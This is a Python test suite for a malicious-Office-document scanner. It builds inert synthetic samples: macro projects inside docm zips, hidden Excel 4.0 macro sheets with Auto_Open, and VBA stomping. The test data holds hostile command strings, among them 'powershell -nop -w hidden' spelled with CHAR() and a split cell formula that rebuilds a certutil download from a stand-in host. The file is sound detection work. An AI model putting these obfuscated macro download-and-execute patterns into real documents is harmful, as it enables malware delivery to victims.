# ruff: noqa: E501  (sample documents are long literal lines)
"""Where macros hide besides plain VBA source: Office zips, Excel 4.0 (XLM) macro sheets in XML and
in the old binary format, and compiled p-code that disagrees with the source (stomping).

The samples are inert test files built here (tests/deephelp.py), written to the published layouts;
none is a real Office file, which is stated in docs/KNOWN_LIMITATIONS.md."""

import random
from typing import Any

import contentscan
import deephelp as d
import filescan
import olescan
import xlmscan

from core.email.models import FileReply


def checked(found: dict[str, Any]) -> dict[str, Any]:
    FileReply.model_validate({"ok": True, "file": found})  # what the host will accept
    return found


def ind(found: dict[str, Any]) -> set[str]:
    return set(found["indicators"])


def sheet_xml(cells: dict[str, str]) -> bytes:
    body = "".join(f'<c r="{r}"><f>{f}</f></c>' for r, f in cells.items())
    return f"<worksheet><sheetData><row>{body}</row></sheetData></worksheet>".encode()


def workbook(hidden: bool, auto: bool) -> dict[str, bytes]:
    state = ' state="veryHidden"' if hidden else ""
    names = (
        '<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>'
        if auto
        else ""
    )
    return {
        "xl/workbook.xml": f'<workbook><sheets><sheet name="Macro1" sheetId="1"{state} r:id="rId9"/></sheets>{names}</workbook>'.encode(),
        "xl/_rels/workbook.xml.rels": b'<Relationships><Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/></Relationships>',
    }


def chars(text: str) -> str:
    return "&amp;".join(f"CHAR({ord(c)})" for c in text)


def xlsm(cells: dict[str, str], hidden: bool = True, auto: bool = True) -> bytes:
    parts = {"xl/macrosheets/sheet1.xml": sheet_xml(cells), **workbook(hidden, auto)}
    return d.ooxml(parts, root="xl")


def member_scans(archive: dict[str, Any]) -> list[dict[str, Any]]:
    return [m["content"] for m in archive["members"] if m["content"]]


# ---- Office zips carrying a macro project ------------------------------------------------------
def test_a_docm_with_a_macro_project_is_read_inside_the_zip() -> None:
    docm = d.ooxml({"word/vbaProject.bin": d.ole_with_macro(d.MACRO_AUTOEXEC_SHELL)})
    found = checked(filescan.inspect_data(docm))
    assert found["kind"] == "archive" and found["vba_project"] is True
    inner = [s for s in member_scans(found) if s["family"] == "ole"]
    assert inner and {"macro_code", "autoexec", "exec_shell"} <= ind(inner[0])


# ---- Excel 4.0 macro sheets stored as XML ------------------------------------------------------
def test_an_xlm_sheet_that_spells_its_command_with_char_is_read() -> None:
    cells = {"A1": chars("powershell -nop -w hidden"), "A2": "EXEC(A1)", "A3": "HALT()"}
    found = checked(filescan.inspect_data(xlsm(cells)))
    sheets = [s for s in member_scans(found) if s["family"] == "xlm"]
    assert sheets
    assert {"xlm_macro", "xlm_hidden", "autoexec", "exec_shell", "hidden_window"} <= ind(sheets[0])


def test_an_xlm_command_spread_over_many_cells_is_put_together() -> None:
    cells = {
        "A1": f'"{"cmd /c "}"&amp;CHAR(99)&amp;CHAR(101)',
        "B1": '"rtutil -urlcache -f http://x.test/a b"',
        "C1": "EXEC(A1&amp;B1)",
    }
    sheets = [
        s for s in member_scans(checked(filescan.inspect_data(xlsm(cells)))) if s["family"] == "xlm"
    ]
    assert {"exec_shell", "download"} <= ind(sheets[0])


def test_a_visible_benign_xlm_sheet_is_only_reported_as_a_macro_sheet() -> None:
    archive = checked(
        filescan.inspect_data(xlsm({"A1": '"Total"', "A2": "ALERT(A1)"}, hidden=False, auto=False))
    )
    sheets = [s for s in member_scans(archive) if s["family"] == "xlm"]
    found = ind(sheets[0])
    assert "xlm_macro" in found and not found & {"xlm_hidden", "autoexec", "exec_shell", "download"}


def test_the_xml_scanner_never_raises_and_stops_on_cycles() -> None:
    cyc = xlmscan.scan_xlm_xml(sheet_xml({"A1": "B1&amp;A2", "A2": "A1", "B1": "A1"}))
    assert cyc["family"] == "xlm"
    rng = random.Random(3)
    for _ in range(100):
        xlmscan.scan_xlm_xml(rng.randbytes(rng.randint(0, 3000)))
    huge = "".join(f'<c r="A{i}"><f>CHAR(65)</f></c>' for i in range(1, 25_000)).encode()
    assert xlmscan.scan_xlm_xml(b"<w>" + huge + b"</w>")["truncated"] is True


# ---- Excel 4.0 macro sheets in the old binary format -------------------------------------------
def test_a_hidden_macro_sheet_with_auto_open_in_an_xls_is_reported() -> None:
    found = checked(
        contentscan.scan_content(
            d.biff_workbook([(2, 1, "Macro1"), (0, 0, "Sheet1")], auto_open=True), "ole"
        )
    )
    assert {"xlm_macro", "xlm_hidden", "autoexec", "macro_code"} <= ind(found)


def test_a_workbook_with_only_ordinary_sheets_has_no_macro() -> None:
    found = checked(
        contentscan.scan_content(d.biff_workbook([(0, 0, "Sheet1"), (0, 2, "Chart1")]), "ole")
    )
    assert not ind(found) & {"xlm_macro", "xlm_hidden", "macro_code", "autoexec"}


def test_a_visible_macro_sheet_is_not_called_hidden() -> None:
    found = checked(contentscan.scan_content(d.biff_workbook([(0, 1, "Macro1")]), "ole"))
    assert "xlm_macro" in ind(found) and "xlm_hidden" not in ind(found)


def test_damaged_binary_workbooks_never_raise() -> None:
    rng = random.Random(5)
    good = d.biff_workbook([(2, 1, "M")], auto_open=True)
    for _ in range(60):
        data = bytearray(good)
        for _ in range(rng.randint(1, 40)):
            data[rng.randrange(len(data))] = rng.randrange(256)
        olescan.scan_ole(bytes(data))


# ---- compiled code that disagrees with the source (VBA stomping) -------------------------------
BENIGN = (
    'Attribute VB_Name = "ThisDocument"\r\nSub Helper()\r\n  Range("A1").Value = 1\r\nEnd Sub\r\n'
)


def pcode(*words: bytes) -> bytes:
    return b"\x00" * 300 + b"\x00".join(words) + b"\x00" * 200


def test_compiled_code_that_names_a_command_the_source_never_mentions_is_stomping() -> None:
    sample = d.ole_with_macro(BENIGN, pcode=pcode(b"powershell -nop -w hidden -c iex"))
    found = checked(contentscan.scan_content(sample, "ole"))
    assert {"vba_stomped", "hidden_window"} <= ind(found)


def test_compiled_code_that_matches_the_source_is_not_stomping() -> None:
    source = BENIGN + 'Sub Run()\r\n  Set o = CreateObject("WScript.Shell")\r\nEnd Sub\r\n'
    found = checked(
        contentscan.scan_content(
            d.ole_with_macro(source, pcode=pcode(b"CreateObject", b"WScript.Shell")), "ole"
        )
    )
    assert "vba_stomped" not in ind(found)


def test_a_large_compiled_part_with_no_source_is_reported() -> None:
    found = checked(
        contentscan.scan_content(
            d.ole_with_macro('Attribute VB_Name = "ThisDocument"\r\n', pcode=b"\x00" * 2000), "ole"
        )
    )
    assert "vba_pcode_only" in ind(found)


def test_an_ordinary_macro_has_neither_flag() -> None:
    found = checked(contentscan.scan_content(d.ole_with_macro(d.MACRO_QUIET), "ole"))
    assert ind(found) == {"macro_code"}
